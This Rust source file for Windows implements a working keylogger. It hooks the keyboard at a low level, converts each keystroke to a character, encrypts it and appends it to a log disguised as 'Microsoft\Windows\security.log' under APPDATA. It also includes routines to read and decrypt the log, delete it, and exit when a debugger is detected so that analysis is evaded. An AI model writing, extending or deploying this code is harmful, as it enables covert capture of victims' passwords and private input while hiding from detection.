
use std::fs::{self, OpenOptions};
use std::process;
use std::sync::Mutex;
use once_cell::sync::Lazy;
use std::io::Write;
use crate::encode::{self, Encode};
use std::path::PathBuf;
use rand::{rngs::StdRng, SeedableRng, Rng};
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;

use windows::Win32::Foundation::{
    HWND, LPARAM, LRESULT, WPARAM
};
use windows::Win32::System::SystemInformation::{
    GetSystemInfo,
    SYSTEM_INFO,
    PROCESSOR_ARCHITECTURE,
    PROCESSOR_ARCHITECTURE_ALPHA,
    PROCESSOR_ARCHITECTURE_ALPHA64,
    PROCESSOR_ARCHITECTURE_AMD64,
    PROCESSOR_ARCHITECTURE_ARM,
    PROCESSOR_ARCHITECTURE_ARM64,
    PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64,
    PROCESSOR_ARCHITECTURE_IA64,
    PROCESSOR_ARCHITECTURE_IA32_ON_ARM64,
    PROCESSOR_ARCHITECTURE_IA32_ON_WIN64,
    PROCESSOR_ARCHITECTURE_INTEL,
    PROCESSOR_ARCHITECTURE_MIPS,
    PROCESSOR_ARCHITECTURE_MSIL,
    PROCESSOR_ARCHITECTURE_NEUTRAL,
    PROCESSOR_ARCHITECTURE_PPC,
    PROCESSOR_ARCHITECTURE_SHX,
    PROCESSOR_ARCHITECTURE_UNKNOWN,
};

use windows::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx,
    DispatchMessageW,
    GetMessageW,
    SetWindowsHookExA,
    TranslateMessage,
    UnhookWindowsHookEx,
    KBDLLHOOKSTRUCT,
    MSG,
    WH_KEYBOARD_LL,
    WM_KEYDOWN

};


use windows::Win32::UI::Input::KeyboardAndMouse::{

    GetKeyState, GetKeyboardState, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_CAPITAL, VK_SHIFT
};

// creates a global encoder
static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new(52)));

static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
    let appdata = std::env::var("APPDATA").expect("APPDATA not found");
    let mut path = PathBuf::from(appdata);
    path.push("Microsoft\\Windows\\security.log");
    path
});

pub fn get_windows_version() -> &'static str{
    let mut system_info = SYSTEM_INFO::default();

    unsafe {
        GetSystemInfo(&mut system_info);
    };

    let arch = unsafe {
        system_info.Anonymous.Anonymous.wProcessorArchitecture
    };

     get_system_arch(arch)
}

fn get_system_arch(arch: PROCESSOR_ARCHITECTURE) ->  &'static str {

    match arch {
        PROCESSOR_ARCHITECTURE_ALPHA => "Alpha",
        PROCESSOR_ARCHITECTURE_ALPHA64 => "Alpha64",
        PROCESSOR_ARCHITECTURE_AMD64 => "x64 (AMD or Intel 64-bit)",
        PROCESSOR_ARCHITECTURE_ARM => "ARM",
        PROCESSOR_ARCHITECTURE_ARM64 => "ARM64",
        PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64 => "ARM32 on Win64",
        PROCESSOR_ARCHITECTURE_IA64 => "Intel Itanium (IA-64)",
        PROCESSOR_ARCHITECTURE_IA32_ON_ARM64 => "x86 emulation on ARM64",
        PROCESSOR_ARCHITECTURE_IA32_ON_WIN64 => "x86 emulation on Win64",
        PROCESSOR_ARCHITECTURE_INTEL => "x86 (32-bit)",
        PROCESSOR_ARCHITECTURE_MIPS => "MIPS",
        PROCESSOR_ARCHITECTURE_MSIL => "MSIL",
        PROCESSOR_ARCHITECTURE_NEUTRAL => "Neutral",
        PROCESSOR_ARCHITECTURE_PPC => "PowerPC",
        PROCESSOR_ARCHITECTURE_SHX => "SHX",
        PROCESSOR_ARCHITECTURE_UNKNOWN => "Unknown",
        _ => "Other / Reserved",
    }
}

pub unsafe fn set_windows_hook(){

    unsafe{

        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_callback), None, 0).unwrap();

        println!("Hook is now listenting");

        let mut msg = MSG::default();

            // This keeps the thread alive to receive hook messages
        while GetMessageW(&mut msg, Some(HWND(std::ptr::null_mut())), 0, 0).as_bool() {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }


        UnhookWindowsHookEx(hook);
    }
}

unsafe extern "system" fn keyboard_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT{

    if code >= 0 && wparam.0 as u32 == WM_KEYDOWN  {

        let kb_struct = &*(lparam.0 as *const KBDLLHOOKSTRUCT);

        let vk_code = kb_struct.vkCode;

        println!("Key event: vkCode = {}, wParam = {}", vk_code, wparam.0);

        let key_pressed = match vk_code {
            8 => {"[BACKSPACE]"}
            9 => {"[TAB]"}
            13 => {"[ENTER]"}
            20 => {"[CAP]"}
            27 => {"[ESC]"}
            92 => {"[WIN]"}
            160 => {"[L-SHIFT]"}
            161 => {"[R-SHIFT]"}
            162 => {"[L-CTRL]"}
            163  => {"[R-CTRL]"}
            _ => &vk_code_to_char(vk_code).unwrap().to_string()
            
        };

        write_into_file(&key_pressed);

    }

    CallNextHookEx(None, code, wparam, lparam)
}

unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{

    unsafe{

        
        let mut keyboard_state = [0u8;256];

        GetKeyboardState(&mut keyboard_state);

            // Simulate Caps Lock toggle
        let caps = GetKeyState(VK_CAPITAL.0 as i32) & 0x0001;
        if caps != 0 {
            keyboard_state[VK_CAPITAL.0 as usize] |= 0x01;
        }

        // Simulate Shift pressed
        let shift = GetKeyState(VK_SHIFT.0 as i32);
        if (shift as u16) & 0x8000 != 0 {
            keyboard_state[VK_SHIFT.0 as usize] |= 0x80;
        }

        let mut char_buf = [0u16; 2];

        let scan_code = MapVirtualKeyW(vk_code, MAPVK_VK_TO_VSC);

        let result = ToUnicode(vk_code, scan_code, Some(& keyboard_state),& mut char_buf, 0);
        
        
        char::from_u32(char_buf[0] as u32)

    }
}


fn write_into_file(button_pressed:& str){
    let mut enc = ENCODER.lock().unwrap();

    let mut data_file = OpenOptions::new()
    .create(true)
    .append(true).
    open(KEYLOGGING_FILE.as_path()).expect("Cannot open file");
    
    let enc = enc.encrypt(button_pressed);
    writeln!(data_file, "{}", &enc).expect("msg");
     
}

pub fn read_file() -> String{
    let mut dec = ENCODER.lock().unwrap();
    println!("{}",KEYLOGGING_FILE.display());
    dec.reset_key();

    OpenOptions::new()
        .create(true) // ← ensures the file exists
        .append(true) // ← opens without truncating
        .open(KEYLOGGING_FILE.as_path())
        .expect("Failed to create or open file");

    let read = fs::read_to_string(KEYLOGGING_FILE.as_path())
    .expect("can't read into file");

    let mut decode_string = String::new();

    for line in read.lines(){
        let decoded_char = dec.decrypt(line);

        decode_string.push_str(&decoded_char);
    }

    dec.reset_key();

    decode_string
}

pub fn delete_file(){

    match fs::remove_file(KEYLOGGING_FILE.as_path()){
        Ok(_) => {

        },
        Err(_) => {

        }
    };
}

pub fn check_for_debugging(){
    unsafe{

        if IsDebuggerPresent().as_bool(){
            print!("Fuck off");
            process::exit(1);
        }

        print!("we good");

    };
}